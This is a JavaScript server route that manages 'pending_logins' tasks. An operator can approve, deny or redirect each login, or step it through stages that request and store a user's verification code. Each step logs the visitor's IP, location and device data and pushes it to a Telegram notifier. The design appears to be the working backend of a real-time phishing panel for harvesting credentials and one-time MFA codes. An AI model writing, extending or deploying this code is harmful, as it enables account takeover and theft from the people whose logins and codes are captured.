import { getDb, ensureTable } from "../../../lib/db.js";
import { notifyAdvance } from "../../../lib/telegram.js";

var cors = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, PATCH, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

function json(data, status) {
  return new Response(JSON.stringify(data), {
    status: status || 200,
    headers: Object.assign({ "Content-Type": "application/json" }, cors),
  });
}

function getClientData(req) {
  var forwarded = req.headers.get("x-forwarded-for") || "";
  var clientIp = (forwarded.split(",")[0] || "").trim() || req.headers.get("x-vercel-ip") || "Unknown";
  var country = req.headers.get("x-vercel-ip-country") || (req.geo && req.geo.country) || "Unknown";
  var city = req.headers.get("x-vercel-ip-country-region") || (req.geo && req.geo.city) || "Unknown";
  return {
    ip: clientIp,
    country: country,
    city: city,
    timezone: "Unknown",
    asOrganization: "Unknown",
  };
}

export async function OPTIONS() {
  return new Response(null, { status: 204, headers: cors });
}

export async function GET(req, { params }) {
  try {
    var id = params.id;
    var sql = getDb(process.env);
    var rows = await sql`SELECT * FROM pending_logins WHERE id = ${id}`;
    if (rows.length === 0) return json({ error: "Task not found" }, 404);
    return json({ task: rows[0] });
  } catch (error) {
    console.error("GET /api/tasks/[id] error:", error);
    return json({ error: "Failed to fetch task" }, 500);
  }
}

export async function PATCH(req, { params }) {
  try {
    var id = params.id;
    var body = await req.json();
    if (body.advance_to) {
      return handleAdvance(req, id, body);
    }
    return handleStatusUpdate(id, body);
  } catch (error) {
    console.error("PATCH /api/tasks/[id] error:", error);
    return json({ error: "Failed to update task" }, 500);
  }
}

async function handleStatusUpdate(id, body) {
  var status = body.status;
  var resolved_by = body.resolved_by || "admin";
  var validStatuses = ["approved", "denied", "redirected"];
  if (validStatuses.indexOf(status) === -1) {
    return json({ error: "status must be one of: " + validStatuses.join(", ") }, 400);
  }
  var sql = getDb(process.env);
  var rows = await sql`
    UPDATE pending_logins
    SET status = ${status},
        resolved_at = ${Date.now()},
        resolved_by = ${resolved_by}
    WHERE id = ${id}
    RETURNING *
  `;
  if (rows.length === 0) return json({ error: "Task not found" }, 404);
  return json({ task: rows[0] });
}

async function handleAdvance(req, id, body) {
  var advance_to = body.advance_to;
  var code_delivery_method = body.code_delivery_method;
  var verification_code = body.verification_code;
  var validSteps = ["code_request", "code_verify"];
  if (validSteps.indexOf(advance_to) === -1) {
    return json({ error: "advance_to must be one of: " + validSteps.join(", ") }, 400);
  }
  var sql = getDb(process.env);
  var now = Date.now();
  var rows;
  if (advance_to === "code_request") {
    rows = await sql`
      UPDATE pending_logins
      SET flow_step = ${advance_to},
          code_delivery_method = ${code_delivery_method || null},
          status = 'pending',
          resolved_at = ${null},
          resolved_by = ${null},
          pending_since = ${now}
      WHERE id = ${id}
      RETURNING *
    `;
  } else {
    rows = await sql`
      UPDATE pending_logins
      SET flow_step = ${advance_to},
          verification_code = ${verification_code || null},
          status = 'pending',
          resolved_at = ${null},
          resolved_by = ${null},
          pending_since = ${now}
      WHERE id = ${id}
      RETURNING *
    `;
  }
  if (rows.length === 0) return json({ error: "Task not found" }, 404);
  var task = rows[0];
  var cfData = getClientData(req);
  task.cf = cfData;
  task.device_info = body.device_info || task.device_info || null;
  task.screen_size = body.screen_size || task.screen_size || null;
  task.referrer = body.referrer || task.referrer || null;
  notifyAdvance(process.env, task);
  return json({ task: task });
}
